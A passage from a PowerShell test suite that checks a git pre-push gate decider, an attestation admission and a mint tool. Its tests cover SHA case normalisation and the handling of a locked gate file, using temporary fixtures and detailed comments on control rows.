            $h22Base = Join-Path $env:TEMP ('lam-wp1-h22-' + [guid]::NewGuid().ToString('N').Substring(0, 10))
            $null = New-Item -ItemType Directory -Force -Path $h22Base | Out-Null

            $h22Shapes = @(
                @{ n = 1; id = 'gate sha LOWERCASE (canonical) '; sha = $h22Lower; declared = $true  },
                @{ n = 2; id = 'gate sha UPPERCASE            '; sha = $h22Upper; declared = $true  },
                @{ n = 3; id = 'gate sha MIXED case           '; sha = $h22Mixed; declared = $true  },
                @{ n = 4; id = 'gate sha ANOTHER commit       '; sha = $h22Other; declared = $false }
            )
            $h22Bad = 0
            $h22AdmTrue = 0; $h22AdmFalse = 0; $h22DecTrue = 0; $h22DecFalse = 0
            foreach ($h22Shape in $h22Shapes) {
                # EVERY ROW GETS ITS OWN ROOT AND ITS OWN GATES DIRECTORY HOLDING EXACTLY ONE GATE, so
                # the artifact under test is the only selectable one for BOTH scans -- the decider
                # globs push-*.yaml and the admission globs *.yaml -- and a refusal cannot come from a
                # neighbour sorting ahead of it and read as agreement.
                $h22Root = Join-Path $h22Base ("row-{0}" -f $h22Shape.n)
                $h22Want = Join-Path $h22Root '.mission\gates'
                $null = New-Item -ItemType Directory -Force -Path $h22Want | Out-Null
                # THE RESOLVER IS ASKED AND ITS ANSWER IS ASSERTED TO BE MINE (H-21's rule):
                # Get-EvidenceGatesDir falls through to `git worktree list` when the directory is
                # ABSENT, so an unasserted call could hand back a REAL gates directory and this
                # member would write fixtures into it. The directory is created FIRST so the resolver
                # takes its direct branch. Case-folding -ne is correct here and only here: these are
                # NTFS paths, where two spellings are one directory.
                $h22Gates = Get-EvidenceGatesDir -Root $h22Root
                if (($h22Gates.Replace('\', '/').TrimEnd('/')) -ne ($h22Want.Replace('\', '/').TrimEnd('/'))) {
                    $h22Ok = $false; $h22Bad++
                    $h22Rows += ("    row {0,-2} CONTAINMENT REFUSED: Get-EvidenceGatesDir answered '{1}', this row's own is '{2}' -- nothing was written" -f $h22Shape.n, $h22Gates, $h22Want)
                    continue
                }
                $h22Text = "kind: push`n" +
                           ("authorized_tip_sha: {0}`n" -f $h22Shape.sha) +
                           "origin_url: $h22Url`n" +
                           "remote_ref: $h22Ref`n" +
                           "authorized_by: fixture`n"
                $h22Path = Join-Path $h22Gates ("push-h22-{0}.yaml" -f $h22Shape.n)
                [System.IO.File]::WriteAllText($h22Path, $h22Text, (New-Object System.Text.UTF8Encoding($false)))
                # (A) THE ADMISSION, and (B) THE DECIDER'S ACTUAL CALL SITE -- the function the
                #     installed pre-push hook runs to decide a real publication.
                $h22Adm = Get-LamOriginAttestationGate -MissionRoot $h22Root -Tip $h22Lower -OriginUrl $h22Url -RemoteRef $h22Ref
                $h22AdmOk = [bool]$h22Adm.ok
                $h22Call = Get-EvidencePushGateForSha -Root $h22Root -Sha $h22Lower -OriginUrl $h22Url -RemoteRef $h22Ref
                $h22Dec = [bool]$h22Call.ok
                # A REFUSAL MUST BE THE TIP'S REFUSAL. Otherwise an unrelated ground -- a mismatched
                # ref, a revoked field -- would look like agreement.
                $h22ForTip = $true
                if (-not $h22Dec) { $h22ForTip = ([string]$h22Call.reason).Contains('sha under test is') }
                if (-not $h22AdmOk) { $h22ForTip = $h22ForTip -and (([string]$h22Adm.reason).Contains('authorizes tip')) }
                if ($h22AdmOk) { $h22AdmTrue++ } else { $h22AdmFalse++ }
                if ($h22Dec)   { $h22DecTrue++ } else { $h22DecFalse++ }
                $h22Expect = [bool]$h22Shape.declared
                $h22Agree = ($h22Dec -eq $h22AdmOk)
                $h22RowOk = $h22Agree -and ($h22Dec -eq $h22Expect) -and ($h22AdmOk -eq $h22Expect) -and $h22ForTip
                if (-not $h22RowOk) { $h22Ok = $false; $h22Bad++ }
                $h22Verdict = 'ok'
                if (-not $h22ForTip) { $h22Verdict = 'refused on ANOTHER ground' }
                if ($h22Dec -ne $h22Expect) { $h22Verdict = 'DECIDER against the declared direction' }
                if ($h22AdmOk -ne $h22Expect) { $h22Verdict = 'ADMISSION against the declared direction' }
                if (-not $h22Agree) { $h22Verdict = 'DISAGREE' }
                $h22Rows += ("    row {0,-2} {1}  admission={2,-5} DECIDER={3,-5} declared={4,-5}  {5}" -f `
                             $h22Shape.n, $h22Shape.id, $h22AdmOk, $h22Dec, $h22Expect, $h22Verdict)
                if (-not $h22RowOk) {
                    $h22Rows += ("         decider said  : {0}" -f ([string]$h22Call.reason))
                    $h22Rows += ("         admission said: {0}" -f ([string]$h22Adm.reason))
                }
            }
            # BOTH READERS MUST HAVE BEEN SEEN ANSWERING BOTH WAYS, or the corpus proved nothing: a
            # reader that always says the same thing would satisfy an agreement test by itself.
            $h22Split = ($h22AdmTrue -ge 1 -and $h22AdmFalse -ge 1 -and $h22DecTrue -ge 1 -and $h22DecFalse -ge 1)
            if (-not $h22Split) { $h22Ok = $false; $h22Bad++ }
            $h22Rows += ("    non-vacuity: the admission authorized {0} time(s) and refused {1}; the decider {2} and {3}; split: {4}" -f `
                         $h22AdmTrue, $h22AdmFalse, $h22DecTrue, $h22DecFalse, $h22Split)
            $h22Rows += ("    rows failing: {0} of {1}" -f $h22Bad, $h22Shapes.Count)

            # ---- THE MINT, WHICH IS THE HALF THAT MAKES THE SHAPE UNREACHABLE -------------------
            # -ComposeOnly runs every refusal and composition step and WRITES NOTHING, needs no
            # console token and runs no operator session condition, so these rows are zero-mutation
            # and a planned write is legible as a PLAN rather than as an absence on disk.
            $h22MintRoot = Join-Path $h22Base 'mintroot'
            $null = New-Item -ItemType Directory -Force -Path $h22MintRoot | Out-Null
            $h22PrevEap = $ErrorActionPreference
            $ErrorActionPreference = 'Continue'
            try {
                $null = & git init --quiet $h22MintRoot 2>&1
                $h22Gd = ("$(& git -C $h22MintRoot rev-parse --absolute-git-dir 2>&1)").Trim()
            } finally { $ErrorActionPreference = $h22PrevEap }
            # THE 2026-09-13 RULE: the git dir is asserted INSIDE the fixture BEFORE any git config,
            # because a fixture that configured first once fell through to the HOST .git/config.
            Add-H22Row -Label 'FIXTURE mint root: git dir resolves INSIDE the fixture before any git config' `
                -Ok ($h22Gd.Replace('/', '\').StartsWith(([System.IO.Path]::GetFullPath($h22MintRoot)), [StringComparison]::OrdinalIgnoreCase)) -Said $h22Gd
            [System.IO.File]::WriteAllText((Join-Path $h22MintRoot 'bound.txt'), "h22 bound`n", (New-Object System.Text.UTF8Encoding($false)))

            function Invoke-H22Mint {
                param([string]$Id, [string]$Tip, [string]$Url)
                $h22Out = ''
                $h22Code = -1
                $h22P = $ErrorActionPreference
                $ErrorActionPreference = 'Continue'
                try {
                    $h22Out = & powershell -NoProfile -ExecutionPolicy Bypass -File $h22GateTool approve -Kind push -Id $Id -Binds 'bound.txt' -MissionRoot $h22MintRoot -TipSha $Tip -OriginUrl $Url -RemoteRef $h22Ref -ComposeOnly 2>&1
                    $h22Code = $LASTEXITCODE
                } finally { $ErrorActionPreference = $h22P }
                $h22Text = ((@($h22Out) | ForEach-Object { [string]$_ }) -join "`n")
                $h22Names = New-Object System.Collections.Generic.List[string]
                $h22Bodies = New-Object System.Collections.Generic.List[string]
                foreach ($h22M in @([regex]::Matches($h22Text, '(?m)^LAMCOMPOSE write (\S+) (\d+) (\S+)\s*$'))) {
                    [void]$h22Names.Add([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($h22M.Groups[1].Value)))
                    [void]$h22Bodies.Add([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($h22M.Groups[3].Value)))
                }
                return [pscustomobject]@{ out = $h22Text; code = $h22Code; names = @($h22Names.ToArray()); bodies = @($h22Bodies.ToArray()) }
            }

            # THE `\r?` BEFORE EACH END-ANCHOR IS LOAD-BEARING AND WAS FOUND BY DRIVING IT. The
            # composer builds its bytes with StringBuilder.AppendLine, which emits CRLF, so a
            # `[ \t]*$` anchor never matches: the CR sits between the value and the line end. On
            # the first RED run that made the two MINT CONTROL rows read False -- controls failing
            # for a reason that has nothing to do with the cure, which is exactly the shape that
            # voids a run. The anchor is kept rather than dropped, because without it a trailing
            # token after the sha would satisfy the row.
            $h22MintUp = Invoke-H22Mint -Id 'h22-up' -Tip $h22Upper -Url $h22Url
            $h22BodyUp = ''
            if ($h22MintUp.bodies.Count -ge 1) { $h22BodyUp = [string]$h22MintUp.bodies[0] }
            Add-H22Row -Label 'MINT an UPPERCASE -TipSha composes exactly one planned write at exit 0' `
                -Ok (($h22MintUp.code -eq 0) -and ($h22MintUp.names.Count -eq 1)) `
                -Said ('exit ' + $h22MintUp.code + ', writes ' + $h22MintUp.names.Count)
            Add-H22Row -Label 'MINT THE ROW: and the composed authorized_tip_sha is the LOWERCASE form' `
                -Ok ([bool]($h22BodyUp -cmatch ('(?m)^authorized_tip_sha:[ \t]*' + [regex]::Escape($h22Lower) + '[ \t]*\r?$'))) `
                -Said (([regex]::Match($h22BodyUp, '(?m)^authorized_tip_sha:.*$')).Value)
            $h22MintLo = Invoke-H22Mint -Id 'h22-lo' -Tip $h22Lower -Url $h22Url
            $h22BodyLo = ''
            if ($h22MintLo.bodies.Count -ge 1) { $h22BodyLo = [string]$h22MintLo.bodies[0] }
            Add-H22Row -Label 'MINT CONTROL a canonical lowercase -TipSha still mints, with the value intact' `
                -Ok (($h22MintLo.code -eq 0) -and ($h22MintLo.names.Count -eq 1) -and
                     ($h22BodyLo -cmatch ('(?m)^authorized_tip_sha:[ \t]*' + [regex]::Escape($h22Lower) + '[ \t]*\r?$'))) `
                -Said ('exit ' + $h22MintLo.code + ', writes ' + $h22MintLo.names.Count)
            # INVERTED CONTROL -- IT VOIDS THE RUN IF IT FIRES. If the mint lower-cased anything but
            # the sha, the two rows above would be reading a blanket normalisation rather than this
            # cure, and a gate's id, its declared origin and its planned filename are all
            # case-significant: a git ref is a case-sensitive identifier and a URL path can be.
            $h22MixUrl = 'https://example.invalid/Org/Repo.git'
            $h22MintCase = Invoke-H22Mint -Id 'h22-MiXeD' -Tip $h22Upper -Url $h22MixUrl
            $h22BodyCase = ''
            if ($h22MintCase.bodies.Count -ge 1) { $h22BodyCase = [string]$h22MintCase.bodies[0] }
            $h22NameCase = ''
            if ($h22MintCase.names.Count -ge 1) { $h22NameCase = [string]$h22MintCase.names[0] }
            Add-H22Row -Label 'MINT INVERTED the cure lower-cases the SHA ONLY -- id, origin_url and filename keep their case' `
                -Ok (($h22BodyCase -cmatch '(?m)^id:[ \t]*h22-MiXeD[ \t]*\r?$') -and
                     ($h22BodyCase -cmatch ('(?m)^origin_url:[ \t]*' + [regex]::Escape($h22MixUrl))) -and
                     ($h22NameCase -cmatch 'h22-MiXeD')) `
                -Said ('planned name ' + $h22NameCase + ' | ' + (([regex]::Match($h22BodyCase, '(?m)^origin_url:.*$')).Value))
        }
    }
} catch {
    # AN ABORT IS THE ABSENCE OF A MEASUREMENT, NOT A PASS.
    $h22Ok = $false
    $h22Rows += ("    H-22 THREW at script line {0}: {1}" -f $_.InvocationInfo.ScriptLineNumber, $_.Exception.Message)
    $h22Rows += '    That is the ABSENCE of a measurement, not a pass.'
}
if ($h22Base -and (Test-Path -LiteralPath $h22Base)) {
    try { Remove-Item -LiteralPath $h22Base -Recurse -Force -ErrorAction Stop } catch { }
}
$h22detail = @"
  ONE QUESTION -- does this gate authorize THIS tip? -- PUT TO THE TWO READERS THAT DECIDE IT AND TO
  THE ONE COMPONENT THAT WRITES THE VALUE, over one corpus of real gate files differing only in the
  SPELLING of a sha. (A) Get-LamOriginAttestationGate, the admission; (B) Get-EvidencePushGateForSha,
  WHICH IS THE INSTALLED DECIDER'S ACTUAL CALL SITE; (C) mission-gate.ps1 approve -ComposeOnly, the
  only writer of authorized_tip_sha in the toolchain. Every row builds its own root and its own gates
  directory holding ONE gate named push-h22-<n>.yaml, so both scans see the same single artifact and
  the sha spelling is the only variable.
$($h22Rows -join "`n")

  WHAT A RED ROW MEANS. DISAGREE: the decider and the admission answer differently for that
  spelling, so the guard that authorizes a real publication is reading a sha by a rule the admission
  does not use -- and before the cure that is the finding, in the PERMISSIVE direction (the decider
  authorizes, the admission refuses). 'against the declared direction': both readers agree but they
  agree on the wrong answer -- the direction ruled here is NORMALISE, because git emits lowercase
  and two spellings of a sha name one commit, unlike a KIND drawn from a closed vocabulary where
  a ruling made the comparison ordinal. 'refused on ANOTHER ground': the fixture became refusable
  for something that is not the tip, so the row proved nothing and must be repaired rather than
  reinterpreted. A split of False means the corpus went one-sided and this member would pass against
  a reader that always says the same thing. MINT THE ROW red means the mint can still emit a
  non-canonical sha, so the readers' agreement is a convention rather than an invariant; MINT
  INVERTED red means the mint lower-cased more than the sha, which voids the mint rows and is a
  defect of its own -- a git ref is a case-sensitive identifier.
  The two reader copies are a DISCLOSED duplication with a reason -- this tree installs without
  tools/lam (LAM-INSTALL sec 2) -- and E113 prices that at a drift-detecting test. H-21 is this
  member's sibling, for the kind predicate.
"@
Check -Id 'H-22' -Title 'the tip predicate means the same thing to the installed pre-push decider, to the origin-attestation admission and to the mint that writes the value, over sha spellings that must authorize and one that must not' `
      -Ok $h22Ok -Detail $h22detail

# =============================================================================================
# H-23 -- THE DECIDER'S OWN CANDIDATE READ IS GUARDED, AND IT REFUSES BY NAME
# =============================================================================================
# THE FINDING (V-3 round 3 finding, re-driven here before it was cured). Round 3 cured exactly this
# shape in the ADMISSION -- lam-verify-admission.ps1's Get-LamOriginAttestationGate, round-2 finding
# of the validation -- and left it UNCURED in the DECIDER, which is the component that actually gates a
# publication. Get-EvidencePushGateForSha's candidate read was a bare
# [System.IO.File]::ReadAllText($f.FullName) inside the push-*.yaml scan, under the hook's top-level
# $ErrorActionPreference = 'Stop'. Driven through the REAL installed hook, with
# push-aaa-locked.yaml held FileShare.None and a valid gate also present, git's stderr read:
#
#     evidence-pre-push.ps1 : Exception calling "ReadAllText" with "1" argument(s): "The process
#     cannot access the file '...\.mission\gates\push-aaa-locked.yaml' because it is being used by
#     another process."   + FullyQualifiedErrorId : IOException,evidence-pre-push.ps1
#
# EXIT 1, and NO "PUSH REFUSED by the LAM pre-push decider" banner: a raw PowerShell stack trace
# where a refusal belongs. The control with the handle released exited 0 and wrote the in-flight
# witness, so the fixture was authorizing all along.
#
# THE WIDTH, STATED HONESTLY AND NO WIDER. The direction is FAIL-CLOSED -- git aborts on the
# non-zero exit and nothing unsafe is admitted -- so this is a DIAGNOSABILITY and defence-in-depth
# gap, NOT an authorization hole. What an operator loses is the sentence naming the file they must
# release; what the build loses is a decider that DIES where a decider should DENY, and a decider
# that dies is not a decider that denied.
#
# WHY THE CURE RETURNS RATHER THAN `continue`, AND WHY ITS STATED REASON IS NOT THE ADMISSION'S.
# The admission's own cure said it refuses "because an unreadable candidate may be the revoked
# gate that would have blocked a match further down this sorted scan". THAT MECHANISM DOES NOT
# EXIST in either scan (V-3 round 3 finding, re-driven): every in-loop refusal in both is a
# `continue`, and the only returns are the pre-scan guards, the success and the fall-through -- so
# NO candidate of any content blocks a match further down. Measured: a REVOKED gate at
# push-aaa.yaml does not stop a byte-identical unrevoked gate at push-zzz.yaml from authorizing the
# same triple, in the DECIDER (ok=True, path push-zzz.yaml) and in the ADMISSION (ok=True, id
# zzz-push), each with the revoked one sitting in `examined`; the controls, each revoked gate
# ALONE, refuse. The two reasons that ARE true are the ones the cured comments state:
#   (1) THE SCAN'S CONTRACT IS A NEGATIVE EXISTENCE CLAIM. Its fall-through return says "no
#       unconsumed push gate is bound to <tip>" and prints the candidates it examined -- a claim
#       about EVERY artifact in that directory. A candidate nobody could read makes that claim
#       unprovable, so `continue` would have the decider assert what it cannot establish while
#       omitting the one file that made it unestablishable.
#   (2) IT WOULD MANUFACTURE A DECIDER-VERSUS-ADMISSION DIVERGENCE IN THE PERMISSIVE DIRECTION.
#       The admission RETURNS on this shape today. A decider that skipped the unreadable candidate
#       and authorized on a later one would AUTHORIZE where the admission REFUSES, over one
#       directory -- verbatim the three review findings' and tip-comparison shape this pair of readers
#       has now recorded four times. H-21 and H-22 are this member's siblings on two other
#       predicates; this is the third, and its subject is the READ rather than a field.
#
# THE ROWS, WITH CONTROLS IN BOTH DIRECTIONS. (a) a locked candidate ENUMERATED FIRST with a valid
# gate also present: the function must RETURN ok=$false naming the file, and THROW NOTHING. (b) the
# POSITIVE CONTROL, the identical fixture with the handle released, which must authorize and name
# the valid gate. (c) the INVERTED CONTROL, which VOIDS this run if it fires: while the handle is
# open the bare read of that same path must itself THROW, and once it is closed the same read must
# SUCCEED. If either half of (c) answers the other way, this fixture's lock never took effect, row
# (a) would be passing FOR THE WRONG REASON, and a control that passes for the wrong reason voids a
# run exactly as an inverted one does.
#
# THE LOCK IS HELD IN-PROCESS. Share modes are per-HANDLE, not per-process, so a FileShare.None
# handle opened here blocks this same process's next read; it is released in a `finally` so a
# failing row cannot leave the fixture pinned and the teardown cannot fail behind it.
$h23Ok = $true
$h23Void = $false
$h23Rows = @()
$h23DecTrue = 0
$h23DecFalse = 0
function Add-H23Row {
    param([string]$Label, [bool]$Ok, [string]$Said)
    if (-not $Ok) { $script:h23Ok = $false }
    $script:h23Rows += ('    {0,-72} : {1}{2}' -f $Label, $Ok, $(if ($Said) { '  -- ' + $Said } else { '' }))
}
# ONE CALL SHAPE FOR EVERY ROW: a crash is a MEASUREMENT, recorded as `threw`, never an abort.
# Before the cure this is the whole finding, so the member must survive it and report it rather
# than take the exception out of the suite.
function Invoke-H23Decider {
    param([string]$Root, [string]$Sha, [string]$Url, [string]$Ref)
    $out = @{ threw = $false; kind = ''; message = ''; ok = $false; reason = ''; path = $null; shape = $false }
    try {
        $v = Get-EvidencePushGateForSha -Root $Root -Sha $Sha -OriginUrl $Url -RemoteRef $Ref
        if ($v -is [hashtable]) {
            $out.shape = ($v.ContainsKey('ok') -and $v.ContainsKey('reason') -and $v.ContainsKey('path'))
            $out.ok = [bool]$v['ok']
            $out.reason = [string]$v['reason']
            $out.path = $v['path']
        } else {
            $out.reason = 'the decider returned a ' + $v.GetType().FullName + ', not the hashtable shape this function returns everywhere else'
        }
    } catch {
        $out.threw = $true
        $out.kind = $_.Exception.GetType().FullName
        $out.message = $_.Exception.Message
    }
    return $out
}
$h23Base = ''
try {
    $h23Url   = 'https://example.invalid/o.git'
    $h23Ref   = 'refs/heads/main'
    $h23Sha   = 'abcdef0123456789abcdef0123456789abcdef01'
    $h23Other = '0000000000000000000000000000000000000000'
    # UNDER $env:TEMP, on a SHORT path, and never under the mission plane.
    $h23Base = Join-Path $env:TEMP ('lam-wp1-h23-' + [guid]::NewGuid().ToString('N').Substring(0, 10))
    $null = New-Item -ItemType Directory -Force -Path $h23Base | Out-Null

    function New-H23Gate {
        param([string]$Path, [string]$Sha, [string]$Url, [string]$Ref)
        $body = "kind: push`n" +
                ("authorized_tip_sha: {0}`n" -f $Sha) +
                "origin_url: $Url`n" +
                "remote_ref: $Ref`n" +
                "authorized_by: fixture`n"
        [System.IO.File]::WriteAllText($Path, $body, (New-Object System.Text.UTF8Encoding($false)))
    }
    # THE RESOLVER IS ASKED AND ITS ANSWER IS ASSERTED TO BE MINE (H-21's and H-22's rule, and it
    # matters more here than there): Get-EvidenceGatesDir falls through to `git worktree list` when
    # the directory is ABSENT, so an unasserted call could hand back a REAL gates directory -- and
    # this member does not merely write into the directory it is given, it opens a file in it with
    # FileShare.None. The directory is created FIRST so the resolver takes its direct branch.
    # Case-folding -ne is correct here and only here: these are NTFS paths, two spellings one
    # directory.
    function Resolve-H23Gates {
        param([string]$Root)
        $want = Join-Path $Root '.mission\gates'
        $null = New-Item -ItemType Directory -Force -Path $want | Out-Null
        $got = Get-EvidenceGatesDir -Root $Root
        if (($got.Replace('\', '/').TrimEnd('/')) -ne ($want.Replace('\', '/').TrimEnd('/'))) {
            return @{ ok = $false; path = $got; want = $want }
        }
        return @{ ok = $true; path = $got; want = $want }
    }

    # ---- FIXTURE 1: a locked candidate AND a gate that authorizes ------------------------------
    $h23Root1 = Join-Path $h23Base 'pair'
    $h23R1 = Resolve-H23Gates -Root $h23Root1
    if (-not $h23R1.ok) {
        Add-H23Row -Label 'CONTAINMENT: the resolver must answer this row own gates directory' -Ok $false `
                   -Said ('answered ' + $h23R1.path + ', this row own is ' + $h23R1.want + ' -- nothing was written and nothing was locked')
    } else {
        $h23Gates1 = [string]$h23R1.path
        $h23Lock   = Join-Path $h23Gates1 'push-aaa-locked.yaml'
        $h23Valid  = Join-Path $h23Gates1 'push-zzz-valid.yaml'
        # The locked candidate binds ANOTHER commit on purpose, so the released control authorizes
        # on push-zzz-valid and NAMES it -- a positive control that named the locked file would not
        # say which artifact the scan selected.
        New-H23Gate -Path $h23Lock  -Sha $h23Other -Url $h23Url -Ref $h23Ref
        New-H23Gate -Path $h23Valid -Sha $h23Sha   -Url $h23Url -Ref $h23Ref

        # PRECONDITION, MEASURED RATHER THAN ASSUMED: the decider does NO Sort-Object -- it walks
        # `Get-ChildItem -Filter 'push-*.yaml'` in the order the filesystem hands it. Row (a)'s
        # whole claim is about a candidate the scan reaches BEFORE the gate that would authorize,
        # so the order this member actually got is asserted here and printed, and a run where the
        # locked file came second proves nothing about row (a) and says so.
        $h23Order = @(Get-ChildItem -LiteralPath $h23Gates1 -File -Filter 'push-*.yaml' | ForEach-Object { $_.Name })
        $h23FirstIsLock = ($h23Order.Count -ge 2 -and ([string]$h23Order[0]) -eq 'push-aaa-locked.yaml')
        Add-H23Row -Label 'PRECONDITION the decider unsorted scan reaches the locked candidate FIRST' -Ok $h23FirstIsLock `
                   -Said ('enumeration order: ' + ($h23Order -join ' -> '))

        $h23Handle = $null
        try {
            $h23Handle = [System.IO.File]::Open($h23Lock, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::None)

            # (c) INVERTED CONTROL, FIRST HALF. If this read SUCCEEDS the lock did nothing and
            # every held row below is measuring an unlocked file, so the run is VOID.
            $h23ReadHeldThrew = $false
            try { $null = [System.IO.File]::ReadAllText($h23Lock) } catch { $h23ReadHeldThrew = $true }
            if (-not $h23ReadHeldThrew) { $h23Void = $true }
            Add-H23Row -Label 'INVERTED CONTROL the held file must be unreadable (VOIDS the run if not)' -Ok $h23ReadHeldThrew `
                       -Said $(if ($h23ReadHeldThrew) { 'the bare read threw while the handle was open' } else { 'THE BARE READ SUCCEEDED -- this run is VOID' })

            # (a) THE MEMBER'S SUBJECT.
            $h23Held = Invoke-H23Decider -Root $h23Root1 -Sha $h23Sha -Url $h23Url -Ref $h23Ref
            if ($h23Held.threw) { } elseif ($h23Held.ok) { $h23DecTrue++ } else { $h23DecFalse++ }
            Add-H23Row -Label '(a) locked candidate first: NOTHING escapes the decider' -Ok (-not $h23Held.threw) `
                       -Said $(if ($h23Held.threw) { $h23Held.kind + ' :: ' + $h23Held.message } else { 'no exception escaped' })
            Add-H23Row -Label '(a) locked candidate first: the decider REFUSES (ok=False)' -Ok ((-not $h23Held.threw) -and (-not $h23Held.ok)) `
                       -Said $(if ($h23Held.threw) { 'not measurable -- it threw' } else { 'ok=' + $h23Held.ok })
            Add-H23Row -Label '(a) the refusal NAMES the unreadable candidate' -Ok ((-not $h23Held.threw) -and ([string]$h23Held.reason).Contains('push-aaa-locked.yaml')) `
                       -Said $(if ($h23Held.threw) { 'not measurable -- it threw' } else { [string]$h23Held.reason })
            # THE REFUSAL MUST CARRY THIS FUNCTION'S OWN SHAPE, {ok; reason; path}, and path must be
            # $null: in this function `path` means THE GATE THAT AUTHORIZED, and nothing authorized.
            # The admission's twin returns its own five-key shape for the same reason -- a refusal
            # in a foreign shape is how a round-1 finding turned a refusal into a StrictMode throw
            # at a caller.
            Add-H23Row -Label '(a) the refusal carries the decider own {ok; reason; path}, path null' -Ok ((-not $h23Held.threw) -and $h23Held.shape -and ($null -eq $h23Held.path)) `
                       -Said $(if ($h23Held.threw) { 'not measurable -- it threw' } else { 'shape=' + $h23Held.shape + ' path=[' + [string]$h23Held.path + ']' })
        } finally {
            if ($h23Handle) { $h23Handle.Dispose(); $h23Handle = $null }
        }

        # (c) INVERTED CONTROL, SECOND HALF: with the handle gone the same read must SUCCEED, or
        # row (a) measured a file that was unreadable for a reason this member did not create.
        $h23ReadFreeOk = $false
        try { $null = [System.IO.File]::ReadAllText($h23Lock); $h23ReadFreeOk = $true } catch { $h23ReadFreeOk = $false }
        Add-H23Row -Label 'INVERTED CONTROL the released file must be readable again' -Ok $h23ReadFreeOk `
                   -Said $(if ($h23ReadFreeOk) { 'the bare read succeeded once the handle was disposed' } else { 'STILL UNREADABLE -- the held rows measured something else; this run is VOID' })
        if (-not $h23ReadFreeOk) { $h23Void = $true }

        # (b) POSITIVE CONTROL: the identical fixture, nothing held.
        $h23Free = Invoke-H23Decider -Root $h23Root1 -Sha $h23Sha -Url $h23Url -Ref $h23Ref
        if ($h23Free.threw) { } elseif ($h23Free.ok) { $h23DecTrue++ } else { $h23DecFalse++ }
        Add-H23Row -Label '(b) POSITIVE CONTROL handle released: the valid gate AUTHORIZES' -Ok ((-not $h23Free.threw) -and $h23Free.ok) `
                   -Said $(if ($h23Free.threw) { $h23Free.kind + ' :: ' + $h23Free.message } else { 'ok=' + $h23Free.ok + ' reason=' + [string]$h23Free.reason })
        Add-H23Row -Label '(b) POSITIVE CONTROL: it NAMES push-zzz-valid, in reason AND in path' -Ok ((-not $h23Free.threw) -and ([string]$h23Free.reason).Contains('push-zzz-valid') -and ([string]$h23Free.path).Contains('push-zzz-valid.yaml')) `
                   -Said $(if ($h23Free.threw) { 'not measurable -- it threw' } else { 'path=' + [string]$h23Free.path })
    }

    # ---- FIXTURE 2: the locked candidate ALONE, so the claim does not rest on scan order --------
    $h23Root2 = Join-Path $h23Base 'solo'
    $h23R2 = Resolve-H23Gates -Root $h23Root2
    if (-not $h23R2.ok) {
        Add-H23Row -Label 'CONTAINMENT: the resolver must answer the solo row own gates directory' -Ok $false `
                   -Said ('answered ' + $h23R2.path + ', this row own is ' + $h23R2.want + ' -- nothing was written and nothing was locked')
    } else {
        $h23Solo = Join-Path ([string]$h23R2.path) 'push-solo-locked.yaml'
        New-H23Gate -Path $h23Solo -Sha $h23Sha -Url $h23Url -Ref $h23Ref
        $h23Handle2 = $null
        try {
            $h23Handle2 = [System.IO.File]::Open($h23Solo, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::None)
            $h23SoloRes = Invoke-H23Decider -Root $h23Root2 -Sha $h23Sha -Url $h23Url -Ref $h23Ref
            if ($h23SoloRes.threw) { } elseif ($h23SoloRes.ok) { $h23DecTrue++ } else { $h23DecFalse++ }
            Add-H23Row -Label 'ORDER-FREE the only candidate is locked: refuses by name, throws nothing' `
                       -Ok ((-not $h23SoloRes.threw) -and (-not $h23SoloRes.ok) -and ([string]$h23SoloRes.reason).Contains('push-solo-locked.yaml')) `
                       -Said $(if ($h23SoloRes.threw) { $h23SoloRes.kind + ' :: ' + $h23SoloRes.message } else { 'ok=' + $h23SoloRes.ok + ' reason=' + [string]$h23SoloRes.reason })
        } finally {
            if ($h23Handle2) { $h23Handle2.Dispose(); $h23Handle2 = $null }
        }
    }

    # NON-VACUITY: the decider must have been seen answering BOTH ways inside this member, or a
    # reader that always refuses would satisfy every row above by itself.
    $h23Split = ($h23DecTrue -ge 1 -and $h23DecFalse -ge 1)
    if (-not $h23Split) { $h23Ok = $false }
    $h23Rows += ("    non-vacuity: the decider authorized {0} time(s) and refused {1} in this member; split: {2}" -f `
                 $h23DecTrue, $h23DecFalse, $h23Split)
    if ($h23Void) {
        $h23Ok = $false
        $h23Rows += '    THIS RUN IS VOID: a control above passed or failed for the wrong reason, so no row here is evidence.'
    }
} catch {
    # AN ABORT IS THE ABSENCE OF A MEASUREMENT, NOT A PASS.
    $h23Ok = $false
    $h23Rows += ("    H-23 THREW at script line {0}: {1}" -f $_.InvocationInfo.ScriptLineNumber, $_.Exception.Message)
    $h23Rows += '    That is the ABSENCE of a measurement, not a pass.'
}
if ($h23Base -and (Test-Path -LiteralPath $h23Base)) {
    try { Remove-Item -LiteralPath $h23Base -Recurse -Force -ErrorAction Stop } catch { }
}
$h23detail = @"
  ONE QUESTION -- what does the DECIDER do when a candidate in the gates directory cannot be READ?
  -- put to Get-EvidencePushGateForSha, WHICH IS THE INSTALLED DECIDER'S ACTUAL CALL SITE
  (evidence-pre-push.ps1:146, under the wrapper git runs). The candidate is made unreadable the way
  a real one becomes unreadable -- another handle holding it with FileShare.None -- and the handle
  is opened IN THIS PROCESS, because share modes are per-handle and not per-process, and released
  in a finally.
$($h23Rows -join "`n")

  WHAT A RED ROW MEANS. '(a) NOTHING escapes the decider' red is the finding itself: the bare
  [System.IO.File]::ReadAllText inside the push-*.yaml scan throws a MethodInvocationException
  under the hook's EAP=Stop, the pre-push hook dies without its refusal banner, and an operator
  gets a stack trace instead of the name of the file they must release. The direction is
  FAIL-CLOSED -- git aborts on the non-zero exit -- so this is DIAGNOSABILITY and defence in depth,
  not an authorization hole, and this member says so rather than overclaiming. 'REFUSES (ok=False)'
  or 'NAMES the unreadable candidate' red without the first one red means the read is guarded but
  the refusal is silent about which file caused it, which is the same operator cost one layer in.
  'carries the decider own {ok; reason; path}' red means a refusal is leaving in a foreign shape --
  a round-1 finding, where exactly that turned a refusal into a StrictMode throw at the caller.
  'POSITIVE CONTROL' red means the fixture stopped authorizing and the held rows therefore proved
  nothing. Either INVERTED CONTROL row red VOIDS the run: the first means the lock never took
  effect and the held rows measured an ordinary readable file; the second means the file was
  unreadable for a reason this member did not create. A split of False means this member only ever
  saw the decider refuse, and a reader that always refuses would pass every row above.
  THE CURE RETURNS RATHER THAN CONTINUING, and its stated reason is NOT the admission's: no
  candidate of any content blocks a match further down either scan (V-3 round 3 finding, measured --
  a revoked gate sorting first does not stop a byte-identical unrevoked gate sorting second in
